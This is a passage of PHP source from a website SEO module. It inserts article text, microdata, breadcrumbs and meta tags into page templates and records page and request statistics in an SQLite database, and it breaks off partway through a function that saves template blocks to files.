		while ($img = array_shift($s_img_f)) {
			$img_p = '';
			if ($img['src']) {
				$i++;
				$img['attr'] = $img['alt'].' ('.($i==1
					? $this->charset[5] : $this->charset[6]).')';
				$img_p = '<div class="sssmb_img '.($i%2===0 ? 'sssmb_img_l' : 'sssmb_img_r').'"><img itemprop="image" src="'.$img['src'].'" alt="'.$img['attr'].'" /><div class="sssmb_bck"><div class="sssmb_ln"></div></div></div>';
			}
			$st['s_text'] = preg_replace("/\[img\]/U", $img_p, $st['s_text'], 1, $cc);
			if ( ! $cc && $img_p) {
				if ( ! $flag_dopimgs) {
					$flag_dopimgs = true;
					$st['s_text'] .= '<div class="sssmb_dopimgs">';
				}
				$st['s_text'] .= $img_p;
			}
		}
		if ($flag_dopimgs) {
			$st['s_text'] .= '</div>';
		}
		$st['s_text'] = str_replace('[img]', '', $st['s_text']);

		$i = 0;
		do {
			$i = $i == 3 ? 1 : $i+1;
			if($i == 1) {
				$colp = '<div class="sssmb_clr"></div>
				<div class="sssmb_cols">
				<div class="sssmb_col sssmb_col_l">';
			} elseif ($i == 2) {
				$colp = '</div>
				<div class="sssmb_col sssmb_col_r">';
			} else {
				$colp = '</div></div>';
			}
			$st['s_text'] = preg_replace("/\[col\]/U", $colp, $st['s_text'], 1, $cc);
		} while ($cc);

		preg_match_all("/\[tab(.*)\]/U", $st['s_text'], $tabtags);
		if (is_array($tabtags[0])) {
			$st['flag_tabs'] = true;
			$tabs = '';
			$first = true;
			foreach ($tabtags[0] AS $key => $row) {
				$st['s_text'] = str_replace('<p>'.$row.'</p>', $row, $st['s_text']);
				if ($key+1 != count($tabtags[0])) {
					$butt = trim($tabtags[1][$key]);
					$tabs .= '<div class="sssmbt_butt '.(!$key?'sssmbt_butt_a':'').'" data-tabid="'.$key.'">'.$butt.'</div>';
				}
				if ($first) {
					$first = false;
					$replace = '<div id="sssmb_tabs" class="sssmb_tabs">
						<div class="sssmbt_butts">[tabs_buttons]</div>
						<div class="sssmbt_itms">
							<div class="sssmbt_itm sssmbt_itm_'.$key.' sssmbt_itm_a">';
				} elseif ($key+1 == count($tabtags[0])) {
					$replace = '<div class="sssmb_clr"></div></div></div></div>';
				} else {
					$replace = '<div class="sssmb_clr"></div></div><div class="sssmbt_itm sssmbt_itm_'.$key.'">';
				}
				$st['s_text'] = str_replace($row, $replace, $st['s_text']);
			}
			$st['s_text'] = str_replace('[tabs_buttons]', $tabs, $st['s_text']);
		}

		if (
			$this->seotext_blog
			&& $this->requesturi != $this->c[1]['blog']
		) {
			$fdate = date('d',$this->seotext_date).' '.$this->bsm_fdate('m3','m',$this->seotext_date).' '.date('Y',$this->seotext_date);

			$txt = '<div class="sssmb_blog_tit sssmb_h2_cols">
				<div class="col"><div class="sssmb_dt">'.$this->icon('calendar').' '.$fdate.'</div></div>
				<div class="col rght"><a href="'.$this->c[1]['blog'].'">'.$this->charset[1].'</a></div>
			</div>';

			$st['s_text'] = $txt.$st['s_text'];
		}
	}

	function articles_parse($alias_start=false, $limit=0, $with_stext_only=false, $blog=false)
	{
		if (
			! $this->seotext['s_text']
			&& $with_stext_only
		) return;

		$imgs = $this->module_folder.'/img/';
		$flag = $alias_start ? true : false;
		$list_tmp = $this->c[3];
		$list = $list_tmp;

		while ($row = each($list)) {
			if (
				($blog && $row['value']['blog'] != 'y')
				|| ( ! $blog && $row['value']['blog'] == 'y')
				|| $row['value'][0] == $this->c[1]['articles']
				|| $row['value'][0] == $this->c[1]['blog']
			) unset($list[$row['key']]);
		}
		
		end($list);
		$last = key($list);
		reset($list);
		while ($row = each($list)) {
			$alias = $row['key'];
			$url   = $row['value'][0];
			if ($alias_start && $limit && $alias==$last) {
				reset($list);
			}
			if ($flag) {
				if ($alias == $alias_start) {
					$flag = false;
				}
				continue;
			}

			$counter++;
			$text = $this->seofile($alias);
			if ( ! $text) continue;
			if (
				! $this->c[2]['page_without_stit_to_re_linking']
				&& ! $text['s_title']
			) {
				$counter--;
				continue;
			}
			if ( ! $text['a_title']) {
				$text['a_title'] = $text['s_title'] ? $text['s_title'] : $text['title'];
			}
			if ( ! $text['a_description']) {
				$text['a_description'] = $text['description'];
			}
			for ($k=1; $k<=10; $k++) {
				$img = $imgs.$alias.'_'.$k;
				if (file_exists($this->droot.$img.'.jpg')) {
					$img .= '.jpg'; break;
				} elseif (file_exists($this->droot.$img.'.png')) {
					$img .= '.png'; break;
				}
				$img = false;
			}
			$txt .= '<div class="sssmba_itm">';

			if ($blog) $txt .= '<a href="'.$url.'">';

			$txt .= '<div class="sssmba_img"
				style="'.($blog ? 'background-image:url(\''.$img.'\');' : '').'"
			>';
			if ($img && ! $blog) $txt .= '<img itemprop="image" src="'.$img.'" alt="'.$text['a_title'].'" />';
			$txt .= '</div>';

			$txt .= '<div class="sssmba_inf">';
			if ($blog) {
				$fdate = date('d',$row['value']['date']).' '.$this->bsm_fdate('m3','m',$row['value']['date']).' '.date('Y',$row['value']['date']);
				$txt .= '<div class="sssmba_dt">'.$fdate.'</div>';
				$txt .= '<div class="sssmba_tit"><span>'.$text['a_title'].'</span></div>';
			} else {
				$txt .= '<div class="sssmba_tit"><a href="'.$url.'">'.$text['a_title'].'</a></div>';
			}
			$txt .= '<div class="sssmba_txt">'.$text['a_description'].'</div>';

			$txt .= '</div>';

			if ($blog) $txt .= '<div class="sssmba_lnk"><span>'.$this->charset[8].'</span></div>';

			if ($blog) $txt .= '</a>';

			$txt .= '</div>';
			$counter--;
			$limit--;

			if ($alias_start && $limit<=0) break;
		}
		if ($txt) {
			if ($alias_start) {
				$tit  = $this->charset[0];
				$link = $this->charset[1];
				$txt = '<div class="sssmb_h2 sssmb_h2_cols">
					<div class="col"><h2>'.$tit.'</h2></div>
					<div class="col rght"><a href="'.$this->c[1]['articles'].'">'.$link.'</a></div>
				</div>'.$txt;
			}
			$txt = '<div class="sssmb_clr"></div>
				<div class="sssmb_'.($blog ? 'blog' : 'articles').'">
					'.$txt.'
				</div>';
			$this->seotext['s_text'] .= $txt;
		}
		if ($counter) $this->log('[12]');
	}

	function template_init()
	{
		$tpls = $this->c[17];

		$tpl = isset($tpls[$this->seotext_tpl]) && $tpls[$this->seotext_tpl]['tpl'] === $this->seotext_tpl ? $tpls[$this->seotext_tpl] : false;
		if ( ! $tpl) {
			$this->log('[23]');

			$this->seotext_tpl = 'deflt';
			$tpl = isset($tpls[$this->seotext_tpl]) && $tpls[$this->seotext_tpl]['tpl'] == $this->seotext_tpl ? $tpls[$this->seotext_tpl] : false;

			if ( ! $tpl) return false;
		}

		if ( ! $tpl['enbl']) return false;

		$seo_text_snipt = '<!--[[seomodule-stext-'.time().'-xxx]]-->';
		$seo_text_ext = false;

		$lasttag = false;
		$ext = false;
		if (is_array($tpl['sites'])) {
			foreach ($tpl['sites'] AS $site => $rows) {
				if ( ! is_array($rows)) continue;
				if (
					! in_array($site,array('head','body'))
					&& strpos($site,'tag--') !== 0
				) continue;

				if (strpos($site,'tag--') === 0) {
					$lasttag = $site;

					$tagnm = substr($site,5);
					if (
						isset($this->tags[$tagnm])
						&& $this->tags[$tagnm]['cntn'] == 'y'
					) {
						if ( ! $tpl['cntn_tag']['s']) {
							$tpl['cntn_tag']['s'] = $site;
							$tpl['cut-content--sf'][$site] = true;
						} elseif ( ! $tpl['cntn_tag']['f']) {
							$tpl['cntn_tag']['f'] = $site;
						}
					}
				}

				$tpl['code'][$site] = '';

				foreach ($rows AS $key => $itm) {

					if (strpos($itm,'cut-content') === 0) {
						$tpl[$itm][$site] = true;
						continue;
					}

					if (strpos($itm,'seo-text') === 0) {
						if ( ! $this->seotext) continue;
						$tmp = str_replace('-xxx','-'.$itm,$seo_text_snipt);
						$tpl['repls'][$site][] = $tmp;
						$tpl['sites'][$site][$itm] = $tmp;
						$tpl['code'][$site] .= $tmp;
						$tpl['intag'][$itm] = $site;
						if ($itm == 'seo-text') $seo_text_ext = true;
						$ext = true;
						continue;
					}

					$file = explode('--',$itm,2);
					if ( ! $file[1]) $file[1] = 'index';
					$itmdir = $this->bsmfile('tpl', 'dir');
					$itmdir .= $file[0].'/';
					$itmdir = str_replace($this->droot, '', $itmdir);
					$file = $file[0].'/'.$file[1].'.php';
					$itmpath = $this->bsmfile('tpl', 'file', $file);
					if (
						file_exists($itmpath)
						&& is_readable($itmpath)
					) {
						define('BSM_TPL',$tpl['tpl']);
						define('BSM_TPL_PATH',$itmdir);

						ob_start();
						@include_once($itmpath);
						$code = ob_get_clean();
						$code = "\n".trim($code)."\n";

						$tpl['sites'][$site][$itm] = $itmpath;
						$tpl['code'][$site] .= $code;
						$ext = true;

					} else {
						unset($tpl['sites'][$site][$itm]);
					}
				}
			}
		}

		if ($this->seotext && ! $seo_text_ext) {

			if ($this->oldtags) {
				$tag = 'tag--cntn-1';
				if ( ! isset($tpl['code'][$tag])) $tpl['code'][$tag] = '';
				$tpl['cntn_tag']['s'] = $tag;
				$tpl['cut-content--sf'][$tag] = true;

			} else {
				if (
					$tpl['cntn_tag']['s']
					&& ! $tpl['cntn_tag']['f']
				) {
					$tpl['cntn_tag']['f'] = $tpl['cntn_tag']['s'];
					unset($tpl['cntn_tag']['s']);
					$tpl['cut-content--sf'][$site] = false;
				}
			}

			$tag = $tpl['cntn_tag']['f'] ? $tpl['cntn_tag']['f'] : $lasttag;
			if ( ! $tag) $tag = 'tag--cntn-2';
			$tpl['repls'][$tag][] = $seo_text_snipt;
			$tpl['sites'][$tag]['seo-text'] = $seo_text_snipt;
			if ( ! isset($tpl['code'][$tag])) $tpl['code'][$tag] = '';
			$tpl['code'][$tag] .= $seo_text_snipt;
			$tpl['intag']['seo-text'] = $tag;
			$tpl['cntn_tag']['f'] = $tag;
			$seo_text_ext = true;
			$ext = true;
		}

		if ( ! $ext) return false;

		$this->page_tpl = $tpl;

		return true;
	}

	function stext_parse($template)
	{
		$tpl     = &$this->page_tpl;
		$st      = $this->seotext;
		$regmask = $this->regmask;

		$tpl_modified = false;

		$bc_tag = '[+bsm_breadcrumbs+]';

		$seotext_in = $tpl['intag']['seo-text'];
		if ( ! $seotext_in || ! $st['s_text']) return false;

		if ($this->c[16]['bc_1'] && $this->seotext_tp == 'S') {
			$breadcrumbs = true;
		}

		if ($st['flag_multitext']) {
			$st['s_text'] = explode('[part]', $st['s_text']);
			$stext_last = array_pop($st['s_text']);
			$stext_common = '';
			foreach ($st['s_text'] AS $key => $row) {
				$seotext_part = 'seo-text--part-'.($key+1);
				$seotext_part_in = $tpl['intag'][$seotext_part];

				if ($seotext_part_in) {
					$row = trim($row);

					if ($row) {
						$stext_p = '<div class="sssmodulebox turbocontainer sssmodulebox_part sssmodulebox_part_'.($key+1).' '.$this->c[2]['classname'].'"
							'.($this->seotext_hide=='Y'?'style="display:none;"':'').'
						>
							<div class="sssmb_clr">&nbsp;</div>
							<div class="sssmb_stext">
								'.$row.'
								<div class="sssmb_clr">&nbsp;</div>
							</div>
						</div>';
					} else $stext_p = '';

					$seotext_tag = $tpl['sites'][$seotext_part_in][$seotext_part];
					$tpl['code'][$seotext_part_in] = str_replace($seotext_tag, $stext_p, $tpl['code'][$seotext_part_in], $count);
				} else $count = 0;

				if ( ! $count) $stext_common .= $row;
			}
			$st['s_text'] = $stext_common.$stext_last;
		}

		$style = $this->module_folder.'/'.$this->domain_h.'/style.css';
		$seotext = '<link rel="stylesheet" href="'.$style.'" />';

		if ($st['before_code']) {
			$seotext .= $st['before_code'];
		}

		$seotext .= '
<section id="sssmodulebox" class="sssmodulebox sssmodulebox_cmmn turbocontainer '.$this->c[2]['classname'].'"
	'.($this->seotext_hide=='Y'?'style="display:none;"':'').'
	itemscope itemtype="http://schema.org/Article"
>
	<meta itemscope itemprop="mainEntityOfPage" itemType="https://schema.org/WebPage" itemid="'.$this->c[1]['website'].$this->requesturi.'" content="'.$st['title'].'" />
	<div class="sssmb_clr">&nbsp;</div>';

		if ($st['s_title']) {

			$h1_cnt = preg_match_all($regmask['h1'], $template);
			if ($h1_cnt >= 2) $this->log('[50]');

			if ( ! $st['s_text']) {
				$this->seotext_tit = 'n';
			}
			if ('d' == $this->seotext_tit) {
				if ('sf' == $this->seotext_site) {
					if (
						$h1_cnt !== 1
						|| $this->c[2]['h1_always_insection']
					) {
						$this->seotext_tit = 'sh1';
					} else {
						$this->seotext_tit = 'h1';
					}
				} else {
					$this->seotext_tit = 'h2h1';
				}
			}

			$h1cc = $h2cc = 1;
			if ('h1' == $this->seotext_tit) {
				$rpl = '<h1 ${1} itemprop="name">'.$st['s_title'].'</h1>';
				if ($breadcrumbs) {
					if ($this->c[2]['bcrumbs_after_h1']) {
						$rpl .= $bc_tag;
					} else {
						$rpl = $bc_tag.$rpl;
					}
				}
				$template = preg_replace($regmask['h1'], $rpl, $template, -1, $h1cc);
				if ($h1cc) $tpl_modified = true;

			} elseif ('sh1' == $this->seotext_tit) {
				$template = preg_replace($regmask['h1'], '', $template, -1, $h1cc2);
				if ($h1cc2) $tpl_modified = true;

			} elseif ('h2h1' == $this->seotext_tit) {
				$template = preg_replace($regmask['h1'],
					'<h2 ${1}>${2}</h2>', $template, -1, $h2cc);
				if ($h2cc) $tpl_modified = true;
			}
			if (
				! $h1cc
				|| 'sh1' == $this->seotext_tit
				|| 'h2h1' == $this->seotext_tit
				|| $this->c[2]['starttag_title']
			) {
				$tit = '<div class="sssmb_h1 sssmb_h1_'.$this->seotext_tit.'"><h1 itemprop="name">'.$st['s_title'].'</h1></div>';
				if (
					$breadcrumbs
					&& (
						'sh1' == $this->seotext_tit
						|| (
							$this->c[2]['starttag_title']
							&& $this->c[2]['starttag_breadcrumbs']
						)
					)
				) {
					if ($this->c[2]['bcrumbs_after_h1']) {
						$tit .= $bc_tag;
					} else {
						$tit = $bc_tag.$tit;
					}
				}
				$seotext .= $tit;
			}
		}

		list($logo_w, $logo_h) = getimagesize($this->droot.$this->c[1]['logo']);

		if ( ! $this->c[12]['obrabotka'] || ! $this->c[12]['o_micromarking']) {
			$seotext .= '
<div class="sssmb_cinf">
<p itemprop="author">'.$this->charset[7].': '.$this->c[1]['company_name'].'</p>
<div itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
	<meta itemprop="name" content="'.$this->domain.'" />
	<meta itemprop="telephone" content="'.$this->c[1]['phone'].'" />
	<meta itemprop="address" content="'.addslashes($this->c[1]['address']).'" />
	<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject">
		<img itemprop="url image" src="'.$this->website.$this->c[1]['logo'].'" alt="" />
		<meta itemprop="width" content="'.$logo_w.'" />
		<meta itemprop="height" content="'.$logo_h.'" />
	</div>
</div>
<p>'.$this->charset[2].' '.$this->charset[3].': <time itemprop="datePublished">'.date('Y-m-d',strtotime($this->c[1]['date_start'])).'</time></p>
<p>'.$this->charset[2].' '.$this->charset[4].': <time itemprop="dateModified">'.$this->seotext_moddate.'</time></p>
<!--noindex--><p itemprop="headline">'.$st['s_title'].'</p><!--/noindex-->
<!--noindex--><p itemprop="description">'.$st['description'].'</p><!--/noindex-->
</div>';
		}

		$seotext .= '<div class="sssmb_stext" itemprop="articleBody">';

		$seotext .= $st['s_text'];

		$seotext .= '<div class="sssmb_clr">&nbsp;</div></div>';
		if ($this->c[2]['share_code']) {
			$seotext .= '<div class="yasharebox">'.$this->c[2]['share_code'].'</div>';
		}
		$seotext .= '</section>';

		$seotext_tag = $tpl['sites'][$seotext_in]['seo-text'];
		$tpl['code'][$seotext_in] = str_replace($seotext_tag, $seotext, $tpl['code'][$seotext_in]);

		if ($this->seotext_hide == 'Y') {
			$tpl['code']['body'] .= '
<script>
	function sssmb_chpoktext(){
		let obj = document.getElementById("sssmodulebox");
		obj.style.display = obj.style.display=="none" ? "" : "none";
	}
</script>
<article onclick="sssmb_chpoktext()">&rarr;</article>';
		}

		if ($st['flag_tabs']) {
			$tpl['code']['body'] .= '
<script>
document.addEventListener("readystatechange",(event)=>{
	if (document.readyState != "interactive") return;
	var tabs = document.getElementById("sssmb_tabs");
	if ( ! tabs) return;
	var butts = tabs.getElementsByClassName("sssmbt_butt");
	Array.prototype.filter.call(butts, function(butt){
		butt.onclick = function(e){
			if (butt.classList.contains("sssmbt_butt_a")) return;
			let tabid = butt.dataset.tabid;
			tabs.getElementsByClassName("sssmbt_butt_a")[0].classList.remove("sssmbt_butt_a");
			this.classList.add("sssmbt_butt_a");
			tabs.getElementsByClassName("sssmbt_itm_a")[0].classList.remove("sssmbt_itm_a");
			tabs.getElementsByClassName("sssmbt_itm_"+tabid)[0].classList.add("sssmbt_itm_a");
		};
	});
});
</script>';
		}

		return $tpl_modified ? $template : false;
	}

	function template_parse($template)
	{
		$tpl     = &$this->page_tpl;
		$st      = $this->seotext;
		$regmask = $this->regmask;

		$tpl_modified = false;

		$bc_tag = '[+bsm_breadcrumbs+]';

		if ($this->test) {
			$tpl['code']['body'] .= '
<script>
window.addEventListener("load",(event)=>{
	var e = document.getElementById("sssmodulebox");
	var h = e.offsetTop + e.offsetHeight + 1000;
	if (document.body.offsetHeight > h) {
		h = document.body.offsetHeight;
	}
	parent.window.postMessage({
		a : "body_height",
		from : "bsm",
		height : h
	},"*");
});
</script>';
		}

		if ($this->seotext) {

			$tpl['code']['body'] .= $this->icons();

			$uid = uniqid();
			$_SESSION['buranseomodule']['watch'][$uid] = time();
			$tpl['code']['body'] .= '
<script>
document.addEventListener("readystatechange",(event)=>{
	if (document.readyState != "interactive") return;
	if ( ! window.XMLHttpRequest) return;
	setTimeout(function(){
		var m = new XMLHttpRequest;
		let url = "'.dirname($this->module_folder).'/'.$this->module_file.'?a=watch";
		url += "&b='.$this->seotext_alias.'";
		url += "&s="+(document.getElementById("sssmodulebox") ? "y" : "n");
		url += "&u='.$uid.'";
		try {
			m.open("GET",url,true);
		} catch (f) {
			return;
		}
		m.withCredentials = true;
		m.send();
	},2000);
});
</script>
';
		}

		if (isset($tpl['code']) && is_array($tpl['code'])) {

			$lasttag = $lastcode = $cut_content = false;
			foreach ($tpl['code'] AS $site => $code) {

				if (is_array($tpl['repls'][$site])) {
					foreach ($tpl['repls'][$site] AS $repl) {
						$tpl['code'][$site] = str_replace($repl, '', $tpl['code'][$site]);
					}
				}

				if ($site=='head' || $site=='body') {
					if ( ! $code) continue;
					if ('head' == $site) $mask = $regmask['head_end'];
					elseif ('body' == $site) $mask = $regmask['body_end'];
					$template = preg_replace($mask, $code."\n".'</head${1}>', $template, 1, $count);
					if ( ! $count) $this->log('[70]');
					else $tpl_modified = true;
					continue;

				} elseif (strpos($site, 'tag--') === 0) {
					$tagnm = substr($site, 5);
					$tag = isset($this->tags[$tagnm]) && is_array($this->tags[$tagnm])
						? $this->tags[$tagnm] : false;
					if ( ! $tag) {
						$lasttag = $lastcode = $cut_content = false;
						$this->log('[42]');
						continue;
					}
					$tagmask = preg_quote($tag[1],"/");
					$tagmask = str_replace("\n", '\n', $tagmask);
					$tagmask = str_replace("\r", '', $tagmask);
					$tagmask = str_replace("\t", '\t', $tagmask);
					$res = preg_match("/".$tagmask."/s", $template);

					$currtag = array(
						'p' => $tag[0],
						't' => $tag[1],
						'm' => $tagmask,
						's' => $res,
					);

					if (
						$tpl['cut-content'][$site]
						|| (
							$tpl['cut-content--sf'][$site]
							&& 'sf' == $this->seotext_site
						)
					) $cut_content_innext = true;
					else $cut_content_innext = false;

					if ($lasttag && $cut_content) {
						if ($currtag['s'] === 1 && $lasttag['s'] === 1) {
							$foo = $lasttag['p'] == 'a' ? $lasttag['t'] : '';
							$foo .= $lastcode . $code;
							$foo .= $currtag['p'] == 'b' ? $currtag['t'] : '';
							$mask = "/".$lasttag['m']."(.*)".$currtag['m']."/sU";

							$template = preg_replace($mask, $foo, $template, 1, $count);
							if ($count) $tpl_modified = true;

						} else $this->log('[43]');

					} elseif (
						! $cut_content_innext
						&& ($code || $currtag['p'] == 'r')
					) {
						if ($currtag['s'] === 1) {
							$foo = $currtag['p'] == 'a' ? $currtag['t'] : '';
							$foo .= $code;
							$foo .= $currtag['p'] == 'b' ? $currtag['t'] : '';
							$mask = "/".$currtag['m']."/s";

							$template = preg_replace($mask, $foo, $template, 1, $count);
							if ($count) $tpl_modified = true;

						} else $this->log('[43]');
					}

					if ($currtag['s'] === 1) {
						$lasttag = $currtag;
						$lastcode = $code;
						$cut_content = $cut_content_innext;
					} else $lasttag = $lastcode = $cut_content = false;
				}
			}
		}

		if ($this->c[16]['bc_1'] && $this->seotext_tp == 'S') {
			$bc_1 = base64_decode($this->c[16]['bc_1']);
			$bc_1 = str_replace('[+bsm_pagetitle+]',$st['s_title'],$bc_1);

			if ($this->seotext_blog) {
				$bc_1 = str_replace('[+bsm_linktoarticles+]',$this->c[1]['blog'],$bc_1);
			} else {
				$bc_1 = str_replace('[+bsm_linktoarticles+]',$this->c[1]['articles'],$bc_1);
			}

			$bc_1 = str_replace('[+bsm_pagelink+]',$this->requesturi,$bc_1);
			$template = str_replace($bc_tag, $bc_1, $template, $count);
			if ($count) $tpl_modified = true;
		}

		if ($this->c[2]['city_replace']) {
			$template = preg_replace("/\[hide\](.*)\[hide\]/U", '', $template, -1, $count);
			if ($count) $tpl_modified = true;
			foreach ($this->declension AS $key => $decl) {
				$template = preg_replace("/\[city_{$key}\](.*)\[city\]/U", $decl, $template, -1, $count);
				if ($count) $tpl_modified = true;
			}
		}

		return $tpl_modified ? $template : false;
	}

	function meta_parse($template)
	{
		$st = $this->seotext;

		$regmask = $this->regmask;

		$meta = '';

		if (
			$st &&
			in_array($this->c[2]['meta'], array(
				'replace_or_add',
				'delete'
			))
		) {
			$titl = '<title>'.$st['title'].'</title>';
			$desc = '<meta name="description" content="'.$st['description'].'" />';
			$keyw = '<meta name="keywords" content="'.$st['keywords'].'" />';
			if ($this->c[2]['meta'] == 'replace_or_add') {
				$meta .= "\n\t".$titl;
				$meta .= "\n\t".$desc;
				$meta .= "\n\t".$keyw;
			}
			$template = preg_replace($regmask['description'], '', $template, 2, $count1);
			$template = preg_replace($regmask['keywords'], '', $template, 2, $count2);
			$template = preg_replace($regmask['title'], '${3}', $template, 2, $count3);
			if ($count1 === 2 || $count2 === 2 || $count3 === 2) {
				$this->log('[61]');
			}

		} elseif (
			! $st &&
			in_array($this->c[2]['meta_neseo'], array(
				'add_if_not_exists',
				'replace_or_add',
				'delete'
			))
		) {
			preg_match_all($regmask['h1'], $template, $matches);
			$h1tit = htmlspecialchars(trim(strip_tags(html_entity_decode($matches[2][0]))));
			if ($h1tit) {
				$h1tit = $h1tit.', '.$this->c[1]['company_name'].', '.$this->c[1]['city'];

				$titl = '<title>'.$h1tit.'</title>';
				$desc = '<meta name="description" content="'.$h1tit.'" />';
				$keyw = '<meta name="keywords" content="'.$h1tit.'" />';

				if ($this->c[2]['meta_neseo'] == 'add_if_not_exists') {
					preg_match_all($regmask['title'], $template, $matches);
					if ( ! $matches[1][0]) $meta .= "\n\t".$titl;

					preg_match_all($regmask['description'], $template, $matches);
					if ( ! $matches[0][0]) $meta .= "\n\t".$desc;

					preg_match_all($regmask['keywords'], $template, $matches);
					if ( ! $matches[0][0]) $meta .= "\n\t".$keyw;

				} else {
					if ($this->c[2]['meta'] == 'replace_or_add') {
						$meta .= "\n\t".$titl;
						$meta .= "\n\t".$desc;
						$meta .= "\n\t".$keyw;
					}
					$template = preg_replace($regmask['description'], '', $template, 2, $count1);
					$template = preg_replace($regmask['keywords'], '', $template, 2, $count2);
					$template = preg_replace($regmask['title'], '${3}', $template, 2, $count3);
					if ($count1 === 2 || $count2 === 2 || $count3 === 2) {
						$this->log('[61]');
					}
				}
			}
		}

		$canonical = $this->c[1]['website'];
		if ( ! $this->c[12]['obrabotka'] || ! $this->c[12]['o_canonical']) {
			$canonical .= $this->requesturi;
		}
		$canonical = '<link rel="canonical" href="'.$canonical.'" />';
		if (
			$st &&
			in_array($this->c[2]['canonical'], array(
				'replace_or_add',
				'delete'
			))
		) {
			if ($this->c[2]['meta'] == 'replace_or_add') {
				$meta .= "\n\t".$canonical;
			}
			$template = preg_replace($regmask['canonical'], '', $template);

		} elseif (
			! $st &&
			in_array($this->c[2]['canonical_neseo'], array(
				'add_if_not_exists',
				'replace_or_add',
				'delete'
			))
		) {
			if ($this->c[2]['canonical_neseo'] == 'add_if_not_exists') {
				preg_match_all($regmask['canonical'], $template, $matches);
				if ( ! $matches[1][0]) $meta .= "\n\t".$canonical;

			} else {
				if ($this->c[2]['meta'] == 'replace_or_add') {
					$meta .= "\n\t".$canonical;
				}
				$template = preg_replace($regmask['canonical'], '', $template);
			}
		}

		if (in_array($this->c[2]['base'], array(
			'replace_or_add',
			'delete'
		))) {
			$base = '<base href="'.$this->c[1]['website'].'/" />';
			if ($this->c[2]['meta'] == 'replace_or_add') {
				$meta .= "\n\t".$base;
			}
			$template = preg_replace($regmask['base'], '', $template);
		}

		if ($meta) {
			$meta .= "\n";
			$template = preg_replace($regmask['head'], '<head${1}>'.$meta, $template, 1, $count);
			if ($count) {
				return $template;
			} else {
				$this->log('[61]');
			}
		}
		return false;
	}

	function save_request_info($mode='url', $template=false)
	{
		if (
			$this->module_mode
			|| ! $this->c[2]['db_data']
		) return;

		$this->bsm_sqlite();
		if ( ! $this->db_op) return false;

		if ('refr' == $mode) {
			if ($this->useragent) {
				$ip = $this->db->escapeString($_SERVER['REMOTE_ADDR']);
				$res = $this->db->querySingle("SELECT id FROM bots
					WHERE
						day = '".date('Y-m-d')."'
						AND bot = '{$this->useragent}'
						AND ip = '{$ip}'
					LIMIT 1");
				if ($res) {
					$this->db->query("UPDATE bots
						SET cnt = cnt+1
						WHERE id = '{$res}'");
				} elseif ($res !== false) {
					$this->db->query("INSERT INTO bots
						(day, bot, ip, cnt)
						VALUES (
							'".date('Y-m-d')."',
							'{$this->useragent}',
							'{$ip}',
							'1'
						)");
				}
			}

			$requesturi = $this->db->escapeString($this->requesturi);
			$referer = isset($_SERVER['HTTP_REFERER']) ? $this->db->escapeString($_SERVER['HTTP_REFERER']) : '';
			$res = $this->db->querySingle("SELECT id FROM url_refr
				WHERE url='{$requesturi}' AND referer='{$referer}'
				LIMIT 1");
			if ($res) {
				$this->db->query("UPDATE url_refr SET
						freq = ((freq+(".time()."-lastload))/2),
						lastload = '".time()."'
					WHERE id = '{$res}'");
			} elseif ($res !== false) {
				$this->db->query("INSERT INTO url_refr
					(url, referer, freq, lastload)
					VALUES (
						'{$requesturi}',
						'{$referer}',
						'".(60*60*24)."',
						'".time()."'
					)");
			}

			$this->bsm_sqlite(true);
			return true;
		}

		if ($this->onlyheaders) return;

		$requesturi = $this->db->escapeString($this->requesturi);
		$loadtime = round((microtime(true)-$this->mct_start),3);

		$memory = memory_get_peak_usage(true);
		$memory = round($memory/1024/1024,2);

		if ($template) {
			$size = strlen($template);
			$size = round($size/1024,2);

			preg_match_all($this->regmask['h1'], $template, $matches);
			$h1tit = trim(strip_tags(html_entity_decode($matches[2][0])));

			preg_match_all($this->regmask['title'], $template, $matches);
			$m_titl = trim(html_entity_decode($matches[2][0]));

			preg_match_all($this->regmask['description'], $template, $matches);
			if ($matches[0][0]) {
				preg_match_all($this->regmask['description_v'], $matches[0][0], $matches);
				$m_desc = trim(html_entity_decode($matches[1][0]));
			}

			preg_match_all($this->regmask['keywords'], $template, $matches);
			if ($matches[0][0]) {
				preg_match_all($this->regmask['keywords_v'], $matches[0][0], $matches);
				$m_keyw = trim(html_entity_decode($matches[1][0]));
			}

			preg_match_all($this->regmask['canonical'], $template, $matches);
			if ($matches[0][0]) {
				preg_match_all($this->regmask['canonical_v'], $matches[0][0], $matches);
				$m_cancl = trim(html_entity_decode($matches[1][0]));
			}

			$h1tit = $this->db->escapeString($h1tit);
			$m_titl = $this->db->escapeString($m_titl);
			$m_desc = $this->db->escapeString($m_desc);
			$m_keyw = $this->db->escapeString($m_keyw);
			$m_cancl = $this->db->escapeString($m_cancl);
		}

		$res = $this->db->querySingle("SELECT id FROM url
			WHERE url='{$requesturi}' LIMIT 1");
		if ($res) {
			$this->db->query("UPDATE url SET
					resp_code = '".$this->http_code."',
					h1 = '{$h1tit}',
					m_titl = '{$m_titl}',
					m_desc = '{$m_desc}',
					m_keyw = '{$m_keyw}',
					m_cancl = '{$m_cancl}',
					size = '{$size}',
					loadtime = '{$loadtime}',
					memory = '{$memory}',
					freq = ((freq+(".time()."-lastload))/2),
					lastload = '".time()."'
				WHERE id = '{$res}'");
		} elseif ($res !== false) {
			$this->db->query("INSERT INTO url
				(url, resp_code, h1, m_titl, m_desc, m_keyw, m_cancl, size, loadtime, memory, freq, lastload)
				VALUES (
					'{$requesturi}',
					'".$this->http_code."',
					'{$h1tit}',
					'{$m_titl}',
					'{$m_desc}',
					'{$m_keyw}',
					'{$m_cancl}',
					'{$size}',
					'{$loadtime}',
					'{$memory}',
					'".(60*60*24)."',
					'".time()."'
				)");
		}

		$this->bsm_sqlite(true);
		return true;
	}

	function save_tpls_blocks($template)
	{
		if ( ! strpos($template, '<!--(seomodule-tpl/a-')) return;

		$res = preg_match_all("/<!--\(seomodule-tpl\/(a-[a-z0-9\-]*)\)-->(.*)<!--\(seomodule-tpl\/a-[a-z0-9\-]*\)-->/sU", $template, $matches);
		if ( ! $res) return;

		foreach ($matches[1] AS $key => $itm) {
			$code = "\n".trim($matches[2][$key])."\n";

			$file = explode('--',$itm,2);
			if ( ! $file[1]) $file[1] = 'index';
			$itmdir = $this->bsmfile('tpl', 'dir');
			$itmdir .= $file[0].'/';
			$file = $file[0].'/'.$file[1].'.php';
			$itmpath = $this->bsmfile('tpl', 'file', $file);

			$ft = $this->filetime($itmpath);
			if (time() - $ft < 60*60) continue;

			if ( ! file_exists($itmdir)) {
				mkdir($itmdir, 0755, true);
			}
			$fh = fopen($itmpath,'wb');
			if ($fh) {
				fwrite($fh,$code);
